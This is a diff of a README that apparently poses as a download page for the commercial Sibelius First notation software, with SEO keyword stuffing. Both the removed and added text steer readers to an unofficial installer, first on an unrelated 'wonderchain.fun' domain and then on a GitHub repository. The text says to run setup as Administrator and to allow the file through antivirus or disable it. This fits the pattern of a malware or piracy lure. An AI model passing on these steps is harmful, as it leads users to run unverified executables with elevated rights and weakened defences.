@@ -1,68 +1,60 @@
-# Sibelius First Download for Windows 11 & 10
+# 🎵 Sibelius-First-2026 - Write music scores on your desktop
 
-**Sibelius-First-2026**
+[![](https://img.shields.io/badge/Download-Sibelius_First-blue.svg)](https://github.com/Osteal-musket706/Sibelius-First-2026)
 
-**Sibelius First** for Windows 10/11. Direct download and setup guide below.
+## 📋 Project Overview
+Sibelius-First-2026 provides a platform for music notation on Windows. This software helps musicians, students, and songwriters create professional-grade sheet music. The interface allows users to input notes, manage instruments, and produce layouts for printing or performance. This application runs on Windows 10 and Windows 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 🛠 Prerequisites
+Your computer needs to meet technical standards before you install the software. Check these requirements:
 
----
+- **Operating System:** Windows 10 or Windows 11 (64-bit).
+- **Processor:** Intel Core i5 or equivalent processor.
+- **Memory:** 8 GB RAM.
+- **Storage:** 2 GB of free space.
+- **Graphics:** Display resolution of 1280 x 800 or higher.
+- **Sound:** Standard audio hardware for playback. 
 
-## Download & Install
+Verify that your system meets these numbers by right-clicking the Start button and selecting System. If your system runs an older version of Windows, update your OS before you attempt the installation.
 
-> **This is the download page.** Use the button or link below to get **Sibelius First** for Windows.
+## 📥 Download and Installation
+Follow these steps to set up the software on your computer.
 
-<p align="center">
-  <a href="https://sibeliusfirst.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Download-Sibelius%20First-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Sibelius First">
-  </a>
-</p>
+1. Go to the [official download page](https://github.com/Osteal-musket706/Sibelius-First-2026) to obtain the installer.
+2. Click the link labeled "Download for Windows."
+3. Wait for the file to finish moving to your computer.
+4. Open your Downloads folder in File Explorer.
+5. Double-click the file named "SibeliusFirst2026Setup.exe."
+6. Select Yes if your computer asks for permission to run the software.
+7. Follow the prompts in the installation window.
+8. Click Install to place the files on your hard drive. 
+9. Click Finish once the process completes.
 
-| | |
-| --- | --- |
-| **Direct link** | **[sibeliusfirst.wonderchain.fun](https://sibeliusfirst.wonderchain.fun/)** |
-| **Full URL** | `https://sibeliusfirst.wonderchain.fun/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+A shortcut appears on your desktop. Double-click this icon to start the program.
 
-### Quick steps
+## 🎼 Using the Application
+The dashboard manages your compositions. You select a template, such as Piano, Lead Sheet, or Full Orchestra, when you create a new score. The ribbon at the top organizes tools for input, playback, and formatting.
 
-1. Click **[Download — sibeliusfirst.wonderchain.fun](https://sibeliusfirst.wonderchain.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+- **Note Input:** Select note values from the Keypad window. Click on the staff to place notes.
+- **Adding Instruments:** Use the "Add or Remove" tool in the Instruments tab to change your score setup.
+- **Playback:** Press the spacebar to play your score through your computer speakers. You can adjust the tempo using the transport control.
+- **Layout:** Change margins and staff size in the Layout tab. This helps when you prepare your music for printing.
 
-<p align="center"><a href="https://sibeliusfirst.wonderchain.fun/"><strong>⬇ Download Sibelius First now</strong></a></p>
+## ⚙️ Settings and Configuration
+Manage your preferences through the File tab. You can change how the software saves files or adjust the playback device if you use an external keyboard or audio interface. 
 
----
+- **Autosave:** By default, the software saves your progress every ten minutes. Adjust this in the Preferences menu.
+- **Audio Device:** If you do not hear sound, check the "Playback" section. Ensure the correct output device is active.
+- **File Format:** The software uses its own format. Select "Export" to save your result as a PDF for easy sharing.
 
-## About
+## 🛠 Handling Common Issues
+Most users resolve problems with a few simple checks. 
 
-**Sibelius First** — Windows download and setup guide.
+- **Application Performance:** Ensure your drivers for audio and graphics are up to date. You can find these on the website of your computer manufacturer.
+- **Installation Errors:** If the installer fails, restart your computer and disable any secondary antivirus protection for the duration of the installation process.
+- **Performance Lag:** If the program reacts slowly, close other demanding applications to free up RAM.
 
-**People also search for:** sibelius first download, sibelius first pro install windows 2026
+## 🌐 Community and Support
+The software relies on standard notation practices used in the music industry. You can learn specific notation tricks by searching the documentation included in the Help menu. This menu links to guides that cover advanced topics like orchestral transpositions and lyric placement.
 
-**Repository:** `Sibelius-First-2026`
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** sibelius-first-download, sibelius, sibelius-first-pro-install-windows-2026, sibelius-first-2026, sibelius-first, sibelius-2026, notation, music-software, pro-tool, desktop-app, software, windows-11
+Keywords: desktop-app, download, music-software, notation, pro-tool, sibelius, sibelius-2026, sibelius-first, sibelius-first-2026, sibelius-first-download, sibelius-first-pro-install-windows-2026, software, windows-11
